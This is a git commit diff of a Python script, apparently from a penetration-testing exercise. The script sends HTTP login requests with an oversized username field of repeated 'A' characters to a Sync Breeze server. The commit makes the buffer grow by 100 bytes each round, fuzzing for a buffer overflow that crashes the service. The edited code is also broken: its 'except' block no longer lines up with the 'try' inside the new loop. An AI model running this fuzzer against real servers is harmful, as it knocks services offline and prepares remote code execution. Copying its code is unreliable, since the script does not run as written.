620b91c0d46f1a984e9779f14fc30148c076bcc1
git <git-user@synology.com>
2023-04-15 17:30:42 +0200

    Increasing the payload by 100 each time

--- sync_breeze.py
+++ sync_breeze.py
@@ -1,46 +1,49 @@
 #!/usr/bin/python
 import socket
+import time
+import sys
 
 IP = "127.0.0.1"
 PORT = 80
 
+size = 100
 
-try:
-    print("\nSending evil buffer ")
-
-    size = 100
-    inputBuffer = "A"*size
-
-    content = "username=" + inputBuffer + "&password=A"
-
-    buffer = "POST /login HTTP/1.1\r\n"
-    buffer += "Host: 192.168.121.10\r\n"
-    buffer += "User-Agent: Mozilla/5.0 (X11; Linux_86_64; rv:52.0) Gecko/20100101 Firefox/52.0\r\n"
-    buffer += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
-    buffer += "Accept-Language: en-US,en;q=0.5\r\n"
-    buffer += "Referer: http://10.11.0.22/login\r\n"
-    buffer += "Connection: close\r\n"
-    buffer += "Content-Type: application/x-www-form-urlencoded\r\n"
-    buffer += "Content-Length: " + str(len(content)) + "\r\n"
-    buffer += "\r\n"
+while (size < 2000):
+    try:
+        print("\nSending evil buffer ")
 
 
-    #
-    # buffer = "POST /login HTTP/1.1\r\n"
-    # buffer += "Content-Type: application/x-www-form-urlencoded\r\n"
-    # buffer += "\r\n"
+        inputBuffer = "A"*size
 
-    buffer += content
+        content = "username=" + inputBuffer + "&password=A"
 
-    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        buffer = "POST /login HTTP/1.1\r\n"
+        buffer += "Host: 192.168.121.10\r\n"
+        buffer += "User-Agent: Mozilla/5.0 (X11; Linux_86_64; rv:52.0) Gecko/20100101 Firefox/52.0\r\n"
+        buffer += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
+        buffer += "Accept-Language: en-US,en;q=0.5\r\n"
+        buffer += "Referer: http://10.11.0.22/login\r\n"
+        buffer += "Connection: close\r\n"
+        buffer += "Content-Type: application/x-www-form-urlencoded\r\n"
+        buffer += "Content-Length: " + str(len(content)) + "\r\n"
+        buffer += "\r\n"
 
-    s.connect(("192.168.121.10", 80))
 
-    s.send(buffer.encode("ascii"))
+        buffer += content
 
-    s.close()
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
-    print("Done")
+        s.connect(("192.168.121.10", 80))
+
+        s.send(buffer.encode("ascii"))
+
+        s.close()
+
+        size += 100
+        time.sleep(10)
+
+        print("Done")
 
 except:
     print("Could not connect")
+    sys.exit()
